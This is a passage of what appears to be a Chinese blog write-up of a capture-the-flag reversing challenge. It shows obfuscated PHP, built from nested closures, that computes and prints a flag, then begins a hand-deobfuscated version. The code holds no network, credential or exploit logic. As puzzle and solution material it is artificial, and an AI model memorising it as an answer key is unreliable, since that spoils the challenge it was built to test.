class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$l1I11lll1l</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)))), <span class="keyword">array</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>), <span class="variable">$l1I11lll1l</span>, <span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1IllI1l11</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))), <span class="keyword">array</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)))))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1IllI1l11</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$l1I11lll1l</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))), <span class="keyword">array</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>), <span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1IllI1l11</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)))), <span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))))), <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$l1I11lll1l</span>)), <span class="keyword">array</span>(<span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))))(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>)), <span class="keyword">array</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))), <span class="variable">$l1I11lll1l</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>), <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1IllI1l11</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$l1I11lll1l</span>))), <span class="variable">$I1IIlII1Il</span>, <span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>)), <span class="variable">$I1IllI1l11</span>(<span class="variable">$l1IIl1II1l</span>(<span class="variable">$l1I11lll1l</span>))(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$l1I11lll1l</span>))))));</span><br><span class="line"><span class="variable">$l11IlII11I</span> = <span class="variable">$l1llIlll1l</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$IlI11III11</span> = <span class="variable">$I1IIlII1Il</span>; <span class="variable">$IlI11III11</span>(<span class="variable">$llIIllIlll</span>)(<span class="number">998244353</span>) &lt; <span class="variable">$IlI11III11</span>(<span class="variable">$I1II11lIl1</span>)(<span class="number">6755399441055744</span>); <span class="variable">$IlI11III11</span> = <span class="variable">$l1IIl1II1l</span>(<span class="variable">$IlI11III11</span>)) &#123;</span><br><span class="line">    <span class="variable">$l1l1l11Il1</span> = <span class="variable">$l1llIlll1l</span>[<span class="variable">$IlI11III11</span>(<span class="variable">$IIl1II1lIl</span>)(<span class="number">1</span>)];</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span> = <span class="variable">$l1llIlll1l</span>[<span class="variable">$I1IllI1l11</span>(<span class="variable">$IlI11III11</span>)(<span class="variable">$IlI11III11</span>)(<span class="variable">$IIl1II1lIl</span>)(<span class="number">1</span>)];</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">0</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">0</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">0</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">3</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">1</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">8</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">8</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">8</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">8</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$lIl11lI1I1</span>[<span class="number">8</span>])(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">6</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">2</span>]));</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">7</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">7</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">7</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">1</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">6</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">7</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">1</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">1</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">2</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">1</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">5</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">8</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">7</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">5</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">8</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">4</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">4</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">7</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">8</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">7</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">7</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">1</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">1</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">0</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">1</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$lIl11lI1I1</span>[<span class="number">1</span>])(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">7</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">2</span>]));</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">5</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">3</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">5</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">5</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">4</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">5</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">3</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">4</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">3</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">0</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">2</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">6</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">5</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">8</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">5</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">5</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">3</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$lIl11lI1I1</span>[<span class="number">3</span>])(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">0</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">3</span>]));</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">2</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">0</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">2</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">2</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">2</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">8</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">4</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">5</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">7</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">4</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">1</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">3</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">6</span>] = <span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">7</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">3</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">3</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$lIl11lI1I1</span>[<span class="number">3</span>])(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">5</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">6</span>]));</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">6</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l1l1l11Il1</span>[<span class="number">0</span>])(<span class="variable">$l11IlII11I</span>[<span class="number">6</span>]))(<span class="variable">$lIl11lI1I1</span>[<span class="number">6</span>]);</span><br><span class="line">    <span class="variable">$lIl11lI1I1</span>[<span class="number">6</span>] = <span class="variable">$I1lll111II</span>(<span class="variable">$lIl11lI1I1</span>[<span class="number">6</span>])(<span class="variable">$I1IllI1l11</span>(<span class="variable">$l11IlII11I</span>[<span class="number">8</span>])(<span class="variable">$l1l1l11Il1</span>[<span class="number">6</span>]));</span><br><span class="line">    <span class="variable">$l11IlII11I</span> = <span class="variable">$lIl11lI1I1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$IlI11III11</span> = <span class="variable">$l1I11lll1l</span>; <span class="variable">$IlI11III11</span>(<span class="variable">$llIIllIlll</span>)(-<span class="number">9</span>); <span class="variable">$IlI11III11</span> = <span class="variable">$I1lll111II</span>(<span class="variable">$l1I11lll1l</span>)(<span class="variable">$IlI11III11</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$l11IlII11I[$IlI11III11($I1II11lIl1)(9)]($lIl1l1lIlI)(0)&#125;</span>-&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$l11IlII11I[$IlI11III11($I1II11lIl1)(9)]($lIl1l1lIlI)(0)&#125;</span>&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="反混淆"><a href="#反混淆" class="headerlink" title="反混淆"></a>反混淆</h3><p>因为混淆用的是闭包函数，所以用正常的xdebug调式并不能看出函数间的调用，而且会因为函数调用层数过多而报错，所以这里唯一的技巧就是手动化简变量名（x</p>
<p>这里给出一份自己处理后的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$f1</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IlllI11</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ll1IlllIIl</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$II1IlllI11</span>, <span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$II1IlllI11</span>(<span class="variable">$lII1lI1IlI</span>(<span class="variable">$II1IlllI11</span>)(<span class="variable">$ll1IlllIIl</span>));</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 自增</span></span><br><span class="line"><span class="variable">$increase</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lII1lI1IlI</span> + <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$f2</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lIlIll1111</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IIl1Ill</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$lIlIll1111</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IlllI11</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$lIlIll1111</span>, <span class="variable">$II1IIl1Ill</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ll1IlllIIl</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$II1IlllI11</span>, <span class="variable">$lIlIll1111</span>, <span class="variable">$II1IIl1Ill</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$lIlIll1111</span>(<span class="variable">$II1IlllI11</span>)(<span class="variable">$II1IIl1Ill</span>(<span class="variable">$II1IlllI11</span>)(<span class="variable">$ll1IlllIIl</span>));</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 自减</span></span><br><span class="line"><span class="variable">$decrease</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lII1lI1IlI</span> - <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$ret_self</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IlllI11</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ll1IlllIIl</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ll1IlllIIl</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 乘3模7</span></span><br><span class="line"><span class="variable">$mul_mod</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lII1lI1IlI</span> * <span class="number">3</span> % <span class="number">7</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$f3</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lIlIll1111</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$f2</span>, <span class="variable">$ret_self</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IIl1Ill</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$lIlIll1111</span>, <span class="variable">$f2</span>, <span class="variable">$ret_self</span></span>) </span>&#123;</span><br><span 